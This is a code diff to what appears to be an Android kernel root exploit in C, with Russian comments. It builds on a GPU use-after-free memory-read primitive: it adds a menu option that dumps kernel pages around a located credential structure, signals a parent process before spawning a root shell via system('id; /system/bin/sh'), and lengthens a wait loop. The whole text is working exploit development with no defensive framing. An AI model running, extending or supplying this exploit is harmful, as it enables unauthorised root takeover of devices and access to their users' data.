@@ -1416,6 +1416,8 @@ static void safe_cred_patch(void)
 
 shell:
     if (patched) {
+        gbuf[GBUF_TASK_SPRAY] = 0x2; // Сначала сигнализируем родителю
+        __sync_synchronize();
         fprintf(stderr, "[CHILD] [+] Spawning root shell...\n");
         system("id; /system/bin/sh");
         exit(0);
@@ -1872,7 +1874,7 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                 int user_decision = 0;
                 while (!user_decision) {
                     fprintf(stderr, "\n    [>] Candidate PID %d at 0x%lx (Offset 0x%x)\n", found_pid, (unsigned long)task_start_va, off);
-                    fprintf(stderr, "    [>] Actions: [y] Use, [n] Skip, [1] Dump Task, [2] Dump CRED, [3] Custom, [4] Pages, [5] Scan neighbors, [6] Full Task, [7] Find all PIDs, [8] Global CRED Scan: ");
+                    fprintf(stderr, "    [>] Actions: [y] Use, [n] Skip, [1] Dump Task, [2] Dump CRED, [3] Custom, [4] Pages, [5] Scan neighbors, [6] Full Task, [7] Find all PIDs, [8] Global CRED Scan, [9] Deep Neighbor Dump: ");
                     fflush(stderr);
                     
                     char choice = 0;
@@ -1985,6 +1987,19 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                                 if (((pva - scan_start) / PAGE_SIZE) % 2048 == 0) fprintf(stderr, ".");
                             }
                             if (!found) fprintf(stderr, "\n    [-] Not found in UAF range.\n");
+                        } else if (choice == '9') {
+                            uint64_t target = found_cred_ptr ? (found_cred_ptr & ~0xFFFULL) : (current_va & ~0xFFFULL);
+                            fprintf(stderr, "    --- Deep Neighbor Dump (5 pages) around 0x%lx ---\n", (unsigned long)target);
+                            for (int p = -2; p <= 2; p++) {
+                                uint64_t pva = target + p * PAGE_SIZE;
+                                uint8_t full_page[4096];
+                                if (gpu_read_task_struct(fd, pva, full_page, 4096) == 0) {
+                                    fprintf(stderr, "\n[PAGE %+d at 0x%lx]\n", p, (unsigned long)pva);
+                                    hex_dump_internal("Page Content", pva, full_page, 4096);
+                                } else {
+                                    fprintf(stderr, "\n[PAGE %+d at 0x%lx] READ FAILED\n", p, (unsigned long)pva);
+                                }
+                            }
                         }
                     }
                 }
@@ -2860,7 +2875,7 @@ restart:;
     gbuf[GBUF_FOUND_PID] = 0x11;
     
     // Ждем результата от ребенка
-    int wait_count = 30;
+    int wait_count = 60; // Увеличили до 60 секунд
     while (wait_count-- > 0 && gbuf[GBUF_TASK_SPRAY] == 0) {
         fprintf(stderr, ".");
         fflush(stderr);
